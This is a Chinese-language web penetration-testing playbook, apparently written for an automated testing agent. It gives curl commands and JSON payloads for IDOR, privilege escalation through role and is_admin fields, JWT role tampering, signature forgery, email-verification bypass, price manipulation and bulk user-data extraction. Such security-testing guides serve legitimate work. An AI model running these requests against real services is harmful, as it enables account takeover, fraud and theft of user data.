# 测试场景详细示例

## 场景 1：JS 分析发现隐藏接口

**目标**：https://example.com

**步骤**：
1. 提取所有 JS 文件（查看页面源码、网络请求）
2. 反混淆 JS 代码（使用 Chrome DevTools 或 浏览器 MCP）
3. 搜索 API 端点：`grep -E '(/api/|/v1/|baseUrl|endpoint)' *.js`
4. 发现隐藏接口：`/api/v1/admin/users`
5. 提取请求参数：`{ "user_id": 1, "role": "admin" }`
6. 分析认证方式：Bearer Token
7. 测试接口并提取数据

**JS 分析示例**：
```javascript
// 从 main.js 中发现的代码
const API_BASE = 'https://api.example.com';

// 隐藏的管理员接口
function getAdminUsers() {
  return fetch(API_BASE + '/api/v1/admin/users', {
    headers: { 'Authorization': 'Bearer ' + getToken() }
  });
}

// 用户相关接口
function getUserProfile(userId) {
  return fetch(API_BASE + '/api/v1/users/' + userId, {
    headers: { 'Authorization': 'Bearer ' + getToken() }
  });
}
```

## 场景 2：注册流程获取凭据

**目标**：https://example.com

**步骤**：
1. 从 JS 中发现注册接口：`/api/v1/register`
2. 分析注册参数：
```json
{
  "username": "testuser",
  "email": "test@tempmail.com",
  "password": "Test123456",
  "phone": "13800138000"
}
```
3. 使用临时邮箱注册新用户
4. 绕过邮箱验证（如可能）：
   - 删除验证参数
   - 修改响应 `{"verified": false}` → `{"verified": true}`
5. 登录获取 token：`/api/v1/login`
6. 使用 token 测试其他接口
7. 尝试越权操作

**注册绕过示例**：
```json
// 原始注册请求
{
  "username": "testuser",
  "email": "test@tempmail.com",
  "password": "Test123456",
  "verify_email": true
}

// 绕过尝试1 - 删除验证参数
{
  "username": "testuser",
  "email": "test@tempmail.com",
  "password": "Test123456"
}

// 绕过尝试2 - 修改验证参数
{
  "username": "testuser",
  "email": "test@tempmail.com",
  "password": "Test123456",
  "verify_email": false
}

// 绕过尝试3 - 修改响应
{
  "username": "testuser",
  "email": "test@tempmail.com",
  "password": "Test123456",
  "verified": true
}
```

## 场景 3：水平越权测试

**目标**：https://example.com/api/v1/users/{id}

**步骤**：
1. 注册两个用户：用户 A 和用户 B
2. 用户 A 登录获取 token_A
3. 用户 B 登录获取 token_B
4. 用户 A 获取自己的数据：`GET /api/v1/users/1 (token_A)`
5. 用户 B 尝试访问用户 A 的数据：`GET /api/v1/users/1 (token_B)`
6. 如果成功，存在水平越权漏洞
7. 枚举所有用户 ID：`/api/v1/users/{1..1000}`
8. 批量提取用户数据

**越权测试示例**：
```bash
# 用户 A 获取自己的数据（成功）
curl -X GET "https://example.com/api/v1/users/1" \
  -H "Authorization: Bearer token_A"
# 响应：{"id": 1, "name": "User A", "email": "user_a@example.com"}

# 用户 B 尝试访问用户 A 的数据（成功=存在漏洞）
curl -X GET "https://example.com/api/v1/users/1" \
  -H "Authorization: Bearer token_B"
# 响应：{"id": 1, "name": "User A", "email": "user_a@example.com"}

# 用户 B 尝试修改用户 A 的数据（可能成功）
curl -X PUT "https://example.com/api/v1/users/1" \
  -H "Authorization: Bearer token_B" \
  -H "Content-Type: application/json" \
  -d '{"name": "Hacked User"}'
```

## 场景 4：垂直越权测试

**目标**：https://example.com/api/v1/admin/users

**步骤**：
1. 注册普通用户并登录
2. 从 JS 中发现管理员接口：`/api/v1/admin/users`
3. 使用普通用户 token 访问管理员接口
4. 如果成功，存在垂直越权漏洞
5. 尝试修改权限参数：
   - 修改 `role: "user"` → `"admin"`
   - 修改 `is_admin: false` → `true`
   - 修改 `user_type: "normal"` → `"admin"`
6. 测试管理员功能：删除用户、修改配置、导出数据

**垂直越权示例**：
```bash
# 普通用户访问管理员接口（成功=存在漏洞）
curl -X GET "https://example.com/api/v1/admin/users" \
  -H "Authorization: Bearer user_token"
# 响应：{"users": [...]}

# 尝试权限提升
curl -X PUT "https://example.com/api/v1/users/profile" \
  -H "Authorization: Bearer user_token" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "is_admin": true}'
# 响应：{"success": true, "role": "admin"}

# 提升权限后访问管理员功能
curl -X GET "https://example.com/api/v1/admin/users" \
  -H "Authorization: Bearer user_token"
# 响应：{"users": [...], "count": 1000}
```

## 场景 5：逻辑漏洞测试

**目标**：https://example.com/api/v1/order

**步骤**：
1. 注册用户并登录
2. 创建订单，分析订单参数：
```json
{
  "product_id": 1,
  "quantity": 1,
  "price": 100,
  "total": 100
}
```
3. 测试逻辑漏洞：
   - 修改价格为负数：`{"price": -100}`
   - 修改数量为负数：`{"quantity": -1}`
   - 参数覆盖：`{"price": 100, "price": 1}`
   - 重复使用优惠券：多次提交相同优惠券
4. 测试越权：
   - 修改订单 ID 访问他人订单
   - 取消他人订单
   - 修改他人订单状态

**逻辑漏洞测试示例**：
```bash
# 价格修改为负数
curl -X POST "https://example.com/api/v1/order" \
  -H "Authorization: Bearer token" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": -100}'
# 响应：{"success": true, "total": -100}

# 数量修改为负数
curl -X POST "https://example.com/api/v1/order" \
  -H "Authorization: Bearer token" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": -5, "price": 100}'
# 响应：{"success": true, "total": -500}

# 参数覆盖
curl -X POST "https://example.com/api/v1/order" \
  -H "Authorization: Bearer token" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "price": 100, "price": 1}'
# 响应：{"success": true, "total": 1}

# 越权访问订单
curl -X GET "https://example.com/api/v1/order/12345" \
  -H "Authorization: Bearer token"
# 响应：{"order_id": 12345, "user_id": 1, ...}

# 尝试访问他人订单
curl -X GET "https://example.com/api/v1/order/12346" \
  -H "Authorization: Bearer token"
# 响应：{"order_id": 12346, "user_id": 2, ...}（成功=存在越权）
```

## 场景 6：JS 逆向分析加密参数 / 签名伪造

> 自研系统下本节升级为矩阵 **i** 强制项：对**所有**带 sign 的业务接口下结论，见 [06-self-dev-auth-matrix.md §i](06-self-dev-auth-matrix.md)。

**目标**：https://example.com/api/v1/data

**步骤**：
1. 分析 JS 中的加密逻辑：
   - 找到签名函数：`sign(params, secret)`
   - 提取密钥：`const SECRET = "abc123"`
   - 分析加密算法：MD5、SHA256、AES、HMAC
2. Hook 加密函数：
   - 在 Chrome DevTools / 浏览器 MCP 中设置断点或 evaluate_script
   - 查看加密前后的参数、进入签名的字段全集
3. 重放请求：
   - 使用提取的密钥和算法
   - 生成新的签名
   - 发送请求测试
4. 测试签名绕过与伪造：
   - 删除签名参数 / 空签名 / 错误签名
   - 旧 sign + 旧参数重放（无时间窗）
   - 已知 secret → 改 amount/userId/role 后重签名（完整伪造）

**JS 加密分析示例**：
```javascript
// 从 JS 中发现的加密函数
function sign(params, secret) {
  const sortedParams = Object.keys(params).sort().map(k => k + '=' + params[k]).join('&');
  const signString = sortedParams + '&secret=' + secret;
  return md5(signString);
}

// 发现的密钥
const SECRET = "abc123xyz456";

// 生成签名
const params = {
  user_id: 12345,
  action: 'getData',
  timestamp: 1699999999
};
const signature = sign(params, SECRET);

// 发送请求
fetch('/api/v1/data?' + new URLSearchParams(params) + '&sign=' + signature, {
  headers: { 'Authorization': 'Bearer ' + token }
});
```

**签名绕过测试**：
```bash
# 原始请求
curl -X GET "https://example.com/api/v1/data?user_id=12345&action=getData&timestamp=1699999999&sign=abc123" \
  -H "Authorization: Bearer token"

# 绕过尝试1 - 删除签名
curl -X GET "https://example.com/api/v1/data?user_id=12345&action=getData&timestamp=1699999999" \
  -H "Authorization: Bearer token"

# 绕过尝试2 - 空签名
curl -X GET "https://example.com/api/v1/data?user_id=12345&action=getData&timestamp=1699999999&sign=" \
  -H "Authorization: Bearer token"

# 绕过尝试3 - 修改参数
curl -X GET "https://example.com/api/v1/data?user_id=12345&action=getData&timestamp=1699999999&sign=wrongsign" \
  -H "Authorization: Bearer token"
```

## 场景 7：凭据接口发现与组合测试（重点）

⚠️ **核心原则**：凭据接口是重点发现目标，获取凭据后立即进行组合测试！

### 7.1 凭据接口类型

| 接口类型 | 发现方式 | 优先级 |
|---------|---------|--------|
| 登录接口 | JS分析、枚举 | ⚠️ 最高 |
| 注册接口 | JS分析、枚举 | ⚠️ 最高 |
| Token生成接口 | JS分析 | ⚠️ 最高 |
| OAuth/SSO接口 | JS分析 | 高 |
| 第三方登录 | JS分析、页面观察 | 高 |
| 密码重置接口 | JS分析、枚举 | 中 |

### 7.2 凭据接口发现示例

**目标**：https://example.com

**步骤**：
1. 从 JS 中发现凭据相关接口：
```javascript
// 从 main.js 中发现的代码
function login(username, password) {
  return fetch('/api/v1/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  });
}

function register(userData) {
  return fetch('/api/v1/register', {
    method: 'POST',
    body: JSON.stringify(userData)
  });
}

function getToken() {
  return fetch('/api/v1/token', {
    method: 'POST'
  });
}
```

2. 发现凭据接口：
   - `/api/v1/login` - 用户登录
   - `/api/v1/register` - 用户注册
   - `/api/v1/token` - Token生成

### 7.3 组合测试示例

**获取凭据后立即进行组合测试**：

```bash
# 步骤1：获取凭据 - 注册新用户
curl -X POST "https://example.com/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "email": "test@example.com", "password": "Test123456"}'
# 响应：{"success": true, "user_id": 12345}

# 步骤2：登录获取 token
curl -X POST "https://example.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "password": "Test123456"}'
# 响应：{"token": "eyJhbGciOiJIUzI1NiIs...", "user_id": 12345}

# 步骤3：⚠️ 立即进行组合测试 - 使用 token 测试所有已发现接口

# 组合测试1 - 测试用户资料接口
curl -X GET "https://example.com/api/v1/profile" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"user_id": 12345, "username": "testuser", ...}

# 组合测试2 - 测试订单接口
curl -X GET "https://example.com/api/v1/orders" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"orders": []}

# 组合测试3 - 测试管理员接口（垂直越权检测）
curl -X GET "https://example.com/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"users": [...]}（成功=存在垂直越权）

# 组合测试4 - 测试其他用户数据（水平越权检测）
curl -X GET "https://example.com/api/v1/users/1" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"user_id": 1, "name": "admin", ...}（成功=存在水平越权）

# 组合测试5 - 发现新接口（横向扩散）
curl -X GET "https://example.com/api/v1/config" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"db_host": "...", "api_key": "sk-xxx", ...}（发现敏感配置）

# 组合测试6 - 链式挖掘（凭据+越权）
curl -X GET "https://example.com/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"users": [...]} → 获取所有用户数据
```

### 7.4 组合测试流程图

```
发现凭据接口 → 获取凭据 → ⚠️立即组合测试所有接口
                                      ↓
    ┌─────────────────┬─────────────────┬─────────────────┐
    ↓                 ↓                 ↓                 ↓
横向扩散        权限提升检测      数据扩展          链式挖掘
测试所有接口    普通→管理员      提取更多数据      凭据+越权
    ↓                 ↓                 ↓                 ↓
发现新接口      垂直越权漏洞      敏感数据          批量数据
```

### 7.5 组合测试注意事项

- ⚠️ 获取凭据后**立即**进行组合测试，不要等待
- ⚠️ 优先测试管理员接口和高权限接口
- ⚠️ 使用凭据测试所有已发现接口，包括疑似无需认证的接口
- ✅ 记录所有成功的组合测试结果
- ✅ 分析响应中的新端点或敏感数据

## 场景 8：role参数权限提升测试（重点）

⚠️ **核心原则**：在注册、登录、资料修改等场景中，**必须枚举测试role等权限参数**，尤其是**0值**绝对不能漏掉！

### 8.1 常见权限参数名

| 参数名 | 常见值 | 说明 |
|-------|--------|------|
| role | 0, 1, 2, admin, user, guest | 角色 |
| permission | 0, 1, 2, 3, admin, write, read | 权限等级 |
| level | 0, 1, 2, 3, super, normal | 级别 |
| user_type | 0, 1, 2, admin, normal, vip | 用户类型 |
| is_admin | 0, 1, true, false | 是否管理员 |
| is_super | 0, 1, true, false | 是否超级管理员 |
| auth_level | 0, 1, 2, 3 | 认证级别 |
| group_id | 0, 1, 2, admin, users | 用户组ID |
| rank | 0, 1, 2, 3, owner, admin | 等级 |

### 8.2 注册时role参数测试

**目标**：POST /api/v1/register

**原始请求**：
```json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456"
}
```

**role参数测试（必须全部测试）**：
```json
// ⚠️ 测试1 - role=0（最高权限，很多系统0代表admin/superuser）
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "role": 0
}

// ⚠️ 测试2 - role=1（可能是管理员或高级用户）
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "role": 1
}

// ⚠️ 测试3 - role=2（可能是版主或特殊用户）
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "role": 2
}

// 测试4 - role=admin
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "role": "admin"
}

// 测试5 - role=super
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "role": "super"
}

// 测试6 - is_admin=1
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "is_admin": 1
}

// 测试7 - is_super=1
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "is_super": 1
}

// 测试8 - permission=0
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "permission": 0
}

// 测试9 - level=0
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "level": 0
}

// 测试10 - group_id=0
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "Test123456",
  "group_id": 0
}
```

### 8.3 资料修改时role参数测试

**目标**：PUT /api/v1/profile 或 PUT /api/v1/users/{id}

**原始请求**：
```json
{
  "username": "testuser",
  "email": "test@example.com",
  "phone": "13800138000"
}
```

**权限提升测试**：
```json
// ⚠️ 测试1 - 修改为role=0
{
  "username": "testuser",
  "email": "test@example.com",
  "phone": "13800138000",
  "role": 0
}

// ⚠️ 测试2 - 修改为role=1
{
  "username": "testuser",
  "email": "test@example.com",
  "phone": "13800138000",
  "role": 1
}

// ⚠️ 测试3 - 添加is_admin=1
{
  "username": "testuser",
  "email": "test@example.com",
  "phone": "13800138000",
  "is_admin": 1
}

// 测试4 - 添加is_super=1
{
  "username": "testuser",
  "email": "test@example.com",
  "phone": "13800138000",
  "is_super": 1
}

// 测试5 - 添加permission=0
{
  "username": "testuser",
  "email": "test@example.com",
  "phone": "13800138000",
  "permission": 0
}
```

### 8.4 登录响应中的role参数测试

**目标**：POST /api/v1/login

**观察响应中的role值并尝试修改**：
```bash
# 登录获取响应
curl -X POST "https://example.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "password": "Test123456"}'
# 响应：{"user_id": 123, "username": "testuser", "role": 1, "token": "..."}

# 尝试使用role=0的token访问管理员接口
curl -X GET "https://example.com/api/v1/admin/users" \
  -H "Authorization: Bearer <token>"
# 如果成功，说明role参数可被前端信任
```

### 8.5 JWT Token中的role参数测试

**目标**：分析JWT Token内容

**JWT结构**：
```
Header.Payload.Signature
```

**解码Payload后尝试修改role**：
```json
// 解码后的Payload
{
  "user_id": 123,
  "username": "testuser",
  "role": 1,
  "exp": 1699999999
}

// ⚠️ 修改role为0并重新签名
{
  "user_id": 123,
  "username": "testuser",
  "role": 0,
  "exp": 1699999999
}
```

### 8.6 Curl测试示例

```bash
# 注册时测试role=0
curl -X POST "https://example.com/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "email": "hacker@test.com", "password": "Test123456", "role": 0}'
# 响应：{"success": true, "user_id": 123, "role": 0}

# 使用role=0的账户登录
curl -X POST "https://example.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "Test123456"}'
# 响应：{"token": "eyJhbGciOiJIUzI1NiIs..."}

# 使用token访问管理员接口
curl -X GET "https://example.com/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# 响应：{"users": [...]}

# 资料修改时提升权限
curl -X PUT "https://example.com/api/v1/profile" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
  -H "Content-Type: application/json" \
  -d '{"role": 0, "is_admin": 1}'
# 响应：{"success": true}
```

### 8.7 role参数测试注意事项

- ⚠️ **0值必须测试**：很多系统0代表最高管理员权限，漏掉0会错过严重漏洞
- ⚠️ **注册时测试**：注册接口中尝试添加role/permission等参数
- ⚠️ **修改时测试**：用户资料修改接口中尝试修改role参数
- ⚠️ **枚举所有值**：0, 1, 2, 3, admin, super, owner等
- ⚠️ **观察响应**：查看响应中是否泄露了role值，分析服务端是否信任前端传来的role
- ⚠️ **JWT测试**：如果使用JWT，尝试解码并修改role值后重新签名
- ✅ 记录所有成功的role参数值
- ✅ 分析服务端对role参数的处理逻辑
